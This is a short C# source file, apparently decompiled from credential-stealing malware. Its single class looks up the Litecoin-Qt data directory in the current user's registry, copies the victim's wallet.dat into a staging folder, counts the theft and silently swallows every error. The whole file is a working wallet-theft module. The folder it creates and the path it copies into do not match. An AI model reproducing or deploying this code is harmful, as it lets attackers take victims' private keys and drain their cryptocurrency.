using Microsoft.Win32;
using System.IO;

internal class ay
{
	public static void a(string jt)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
			{
				try
				{
					Directory.CreateDirectory(jt + "\\Wallets\\LitecoinCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", jt + "\\LitecoinCore\\wallet.dat");
					ba.a++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
